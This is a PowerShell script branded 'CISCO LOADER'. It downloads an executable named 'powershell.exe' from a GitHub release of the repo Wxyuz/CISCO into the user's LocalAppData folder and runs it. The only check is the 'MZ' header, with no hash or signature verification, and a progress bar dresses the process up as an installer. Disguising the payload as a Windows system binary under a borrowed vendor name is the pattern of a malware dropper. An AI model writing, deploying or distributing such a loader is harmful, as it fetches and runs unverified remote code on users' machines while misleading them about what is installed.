$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

try {
    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
    $OutputEncoding = [System.Text.Encoding]::UTF8
}
catch {
}

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
}
catch {
}

# ==========================================================
# CISCO PURE GREEN BAR LOADER
# Repo    : https://github.com/Wxyuz/CISCO
# Script  : P.ps
# Release : v1.0.0
# Asset   : powershell.exe
# ==========================================================

$AppTitle = "CISCO LOADER"

$RepoOwner = "Wxyuz"
$RepoName = "CISCO"
$TagName = "v1.0.0"

$ReleaseAssetName = "powershell.exe"
$LocalExeName = "powershell.exe"

$DownloadUrl = "https://github.com/$RepoOwner/$RepoName/releases/download/$TagName/$ReleaseAssetName"

function Get-SafeLocalAppData {
    if (![string]::IsNullOrWhiteSpace($env:LOCALAPPDATA)) {
        return $env:LOCALAPPDATA
    }

    if (![string]::IsNullOrWhiteSpace($env:USERPROFILE)) {
        return (Join-Path $env:USERPROFILE "AppData\Local")
    }

    return $PWD.Path
}

$InstallRoot = Join-Path (Get-SafeLocalAppData) "Wxyuz"
$InstallDir = Join-Path $InstallRoot "CISCO"
$OutFile = Join-Path $InstallDir $LocalExeName
$TempFile = "$OutFile.download"

$LoaderMutexName = "Wxyuz_CISCO_Pure_Green_Loader_v1_0_0"
$LoaderMutex = $null
$LoaderMutexCreated = $false

function Initialize-Console {
    try {
        Clear-Host
    }
    catch {
    }

    try {
        $Host.UI.RawUI.WindowTitle = $AppTitle
    }
    catch {
    }

    try {
        [Console]::CursorVisible = $false
    }
    catch {
    }

    try {
        [Console]::ForegroundColor = [ConsoleColor]::Green
    }
    catch {
    }

    try {
        $RawUi = $Host.UI.RawUI
        $Size = $RawUi.BufferSize
        $Size.Width = 90
        $RawUi.BufferSize = $Size
    }
    catch {
    }
}

function Restore-Console {
    try {
        [Console]::CursorVisible = $true
    }
    catch {
    }

    try {
        [Console]::ResetColor()
    }
    catch {
    }
}

function Close-LoaderWindow {
    try {
        Restore-Console
    }
    catch {
    }

    try {
        Clear-Host
    }
    catch {
    }

    exit 0
}

function Show-GreenBar {
    param(
        [int]$Percent
    )

    if ($Percent -lt 0) {
        $Percent = 0
    }

    if ($Percent -gt 100) {
        $Percent = 100
    }

    $BarWidth = 72
    $Filled = [int](($Percent * $BarWidth) / 100)

    if ($Filled -lt 0) {
        $Filled = 0
    }

    if ($Filled -gt $BarWidth) {
        $Filled = $BarWidth
    }

    $Empty = $BarWidth - $Filled

    $Block = [string][char]0x2588
    $Space = " "

    $Bar = "[" + ($Block * $Filled) + ($Space * $Empty) + "]"

    try {
        [Console]::SetCursorPosition(0, 0)
    }
    catch {
    }

    try {
        [Console]::ForegroundColor = [ConsoleColor]::Green
    }
    catch {
    }

    try {
        [Console]::Write($Bar.PadRight(90))
    }
    catch {
    }
}

function Show-ErrorPopup {
    param(
        [string]$Message
    )

    try {
        Restore-Console
    }
    catch {
    }

    try {
        Clear-Host
    }
    catch {
    }

    try {
        Add-Type -AssemblyName System.Windows.Forms
        [void][System.Windows.Forms.MessageBox]::Show(
            $Message,
            "CISCO LOADER ERROR",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
    catch {
        Write-Host ""
        Write-Host "ERROR"
        Write-Host ""
        Write-Host $Message
        Write-Host ""
        Write-Host "Press Enter to close..."
        [void][System.Console]::ReadLine()
    }
}

function Ensure-Folder {
    param(
        [string]$Path
    )

    if (!(Test-Path -LiteralPath $Path)) {
        New-Item -ItemType Directory -Path $Path -Force | Out-Null
    }
}

function Normalize-PathSafe {
    param(
        [string]$Path
    )

    try {
        return ([System.IO.Path]::GetFullPath($Path).TrimEnd('\'))
    }
    catch {
        return $Path
    }
}

function Test-WindowsExe {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    if (!(Test-Path -LiteralPath $Path)) {
        return $false
    }

    $Stream = $null

    try {
        $Stream = [System.IO.File]::Open(
            $Path,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::Read,
            [System.IO.FileShare]::ReadWrite
        )

        if ($Stream.Length -lt 2) {
            return $false
        }

        $Buffer = New-Object byte[] 2
        [void]$Stream.Read($Buffer, 0, 2)

        if ($Buffer[0] -eq 0x4D -and $Buffer[1] -eq 0x5A) {
            return $true
        }

        return $false
    }
    catch {
        return $false
    }
    finally {
        if ($null -ne $Stream) {
            try {
                $Stream.Close()
            }
            catch {
            }
        }
    }
}

function Add-WindowTools {
    try {
        if (!("CISCO_WindowTools.Win32Window" -as [type])) {
            Add-Type @"
using System;
using System.Runtime.InteropServices;

namespace CISCO_WindowTools
{
    public static class Win32Window
    {
        [DllImport("user32.dll")]
        public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        public static extern bool SetForegroundWindow(IntPtr hWnd);
    }
}
"@
        }
    }
    catch {
    }
}

function Restore-AppWindow {
    param(
        [int]$ProcessId
    )

    try {
        Add-WindowTools

        $Process = Get-Process -Id $ProcessId -ErrorAction Stop

        if ($Process.MainWindowHandle -ne 0) {
            [void][CISCO_WindowTools.Win32Window]::ShowWindowAsync($Process.MainWindowHandle, 9)
            [void][CISCO_WindowTools.Win32Window]::SetForegroundWindow($Process.MainWindowHandle)
            return $true
        }
    }
    catch {
    }

    return $false
}

function Get-RunningGuiProcesses {
    $TargetPath = Normalize-PathSafe $OutFile
    $Result = New-Object System.Collections.ArrayList

    try {
        $Processes = Get-CimInstance Win32_Process -ErrorAction Stop

        foreach ($ProcessItem in $Processes) {
            if ($null -ne $ProcessItem.ExecutablePath) {
                $ProcessPath = Normalize-PathSafe $ProcessItem.ExecutablePath

                if ($ProcessPath -ieq $TargetPath) {
                    [void]$Result.Add($ProcessItem)
                }
            }
        }
    }
    catch {
        try {
            $Processes = Get-WmiObject Win32_Process -ErrorAction Stop

            foreach ($ProcessItem in $Processes) {
                if ($null -ne $ProcessItem.ExecutablePath) {
                    $ProcessPath = Normalize-PathSafe $ProcessItem.ExecutablePath

                    if ($ProcessPath -ieq $TargetPath) {
                        [void]$Result.Add($ProcessItem)
                    }
                }
            }
        }
        catch {
        }
    }

    foreach ($Item in $Result) {
        Write-Output $Item
    }
}

function Test-AnyRunningGui {
    $Found = $false

    foreach ($Item in Get-RunningGuiProcesses) {
        $Found = $true
    }

    return $Found
}

function Restore-RunningGui {
    foreach ($Item in Get-RunningGuiProcesses) {
        try {
            [void](Restore-AppWindow -ProcessId ([int]$Item.ProcessId))
        }
        catch {
        }
    }
}

function Remove-TempFile {
    if (Test-Path -LiteralPath $TempFile) {
        try {
            Remove-Item -LiteralPath $TempFile -Force
        }
        catch {
        }
    }
}

function Invoke-DownloadFileWithGreenBar {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Url,

        [Parameter(Mandatory = $true)]
        [string]$Destination
    )

    $Request = $null
    $Response = $null
    $InputStream = $null
    $OutputStream = $null

    try {
        Show-GreenBar -Percent 0

        $Request = [System.Net.HttpWebRequest]::Create($Url)
        $Request.Method = "GET"
        $Request.AllowAutoRedirect = $true
        $Request.MaximumAutomaticRedirections = 10
        $Request.UserAgent = "Mozilla/5.0 CISCO-Loader"
        $Request.Timeout = 60000
        $Request.ReadWriteTimeout = 60000
        $Request.KeepAlive = $false

        $Response = $Request.GetResponse()
        $InputStream = $Response.GetResponseStream()

        $OutputStream = [System.IO.File]::Open(
            $Destination,
            [System.IO.FileMode]::Create,
            [System.IO.FileAccess]::Write,
            [System.IO.FileShare]::None
        )

        $TotalBytes = [Int64]$Response.ContentLength
        $TotalRead = [Int64]0
        $Buffer = New-Object byte[] 65536
        $UnknownPercent = 0

        while ($true) {
            $Read = $InputStream.Read($Buffer, 0, $Buffer.Length)

            if ($Read -le 0) {
                break
            }

            $OutputStream.Write($Buffer, 0, $Read)
            $TotalRead += $Read

            if ($TotalBytes -gt 0) {
                $Percent = [int](($TotalRead * 100) / $TotalBytes)
                Show-GreenBar -Percent $Percent
            }
            else {
                $UnknownPercent += 1

                if ($UnknownPercent -gt 95) {
                    $UnknownPercent = 95
                }

                Show-GreenBar -Percent $UnknownPercent
            }
        }

        Show-GreenBar -Percent 100

        if (!(Test-Path -LiteralPath $Destination)) {
            throw "Download failed. File not created."
        }

        $DownloadedItem = Get-Item -LiteralPath $Destination

        if ($DownloadedItem.Length -le 0) {
            throw "Download failed. File size is 0 bytes."
        }
    }
    catch [System.Net.WebException] {
        $Message = $_.Exception.Message

        try {
            if ($null -ne $_.Exception.Response) {
                $StatusCode = [int]$_.Exception.Response.StatusCode
                $StatusDescription = $_.Exception.Response.StatusDescription
                $Message = "HTTP $StatusCode $StatusDescription - $Message"
            }
        }
        catch {
        }

        throw $Message
    }
    finally {
        if ($null -ne $OutputStream) {
            try {
                $OutputStream.Close()
            }
            catch {
            }
        }

        if ($null -ne $InputStream) {
            try {
                $InputStream.Close()
            }
            catch {
            }
        }

        if ($null -ne $Response) {
            try {
                $Response.Close()
            }
            catch {
            }
        }
    }
}

function Download-Loader {
    Ensure-Folder -Path $InstallDir
    Remove-TempFile

    Invoke-DownloadFileWithGreenBar -Url $DownloadUrl -Destination $TempFile

    if (!(Test-Path -LiteralPath $TempFile)) {
        throw "Download failed. Temp file not found."
    }

    if (!(Test-WindowsExe -Path $TempFile)) {
        try {
            Remove-Item -LiteralPath $TempFile -Force
        }
        catch {
        }

        throw "Downloaded file is not a valid Windows EXE."
    }

    if (Test-Path -LiteralPath $OutFile) {
        try {
            Remove-Item -LiteralPath $OutFile -Force
        }
        catch {
            throw "Cannot replace old file because GUI is still running or locked."
        }
    }

    Move-Item -LiteralPath $TempFile -Destination $OutFile -Force

    if (!(Test-Path -LiteralPath $OutFile)) {
        throw "Final EXE file not found."
    }

    if (!(Test-WindowsExe -Path $OutFile)) {
        throw "Final file is not a valid Windows EXE."
    }
}

function Start-GuiOnce {
    if (Test-AnyRunningGui) {
        Restore-RunningGui
        return
    }

    $StartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $StartInfo.FileName = $OutFile
    $StartInfo.WorkingDirectory = $InstallDir
    $StartInfo.UseShellExecute = $true
    $StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal

    $Process = [System.Diagnostics.Process]::Start($StartInfo)

    Start-Sleep -Seconds 2

    if ($null -eq $Process) {
        throw "GUI process failed to start."
    }

    try {
        $Process.Refresh()

        if ($Process.HasExited) {
            throw "GUI opened and closed immediately. ExitCode: $($Process.ExitCode)"
        }
    }
    catch {
        throw $_
    }
}

try {
    Initialize-Console

    $LoaderMutex = New-Object System.Threading.Mutex($true, $LoaderMutexName, [ref]$LoaderMutexCreated)

    if (-not $LoaderMutexCreated) {
        if (Test-AnyRunningGui) {
            Restore-RunningGui
        }

        Close-LoaderWindow
    }

    if (Test-AnyRunningGui) {
        Restore-RunningGui
        Close-LoaderWindow
    }

    Download-Loader
    Start-GuiOnce
    Close-LoaderWindow
}
catch {
    Show-ErrorPopup -Message $_.Exception.Message
}
finally {
    if ($null -ne $LoaderMutex) {
        try {
            if ($LoaderMutexCreated) {
                $LoaderMutex.ReleaseMutex()
            }

            $LoaderMutex.Dispose()
        }
        catch {
        }
    }

    Restore-Console
}
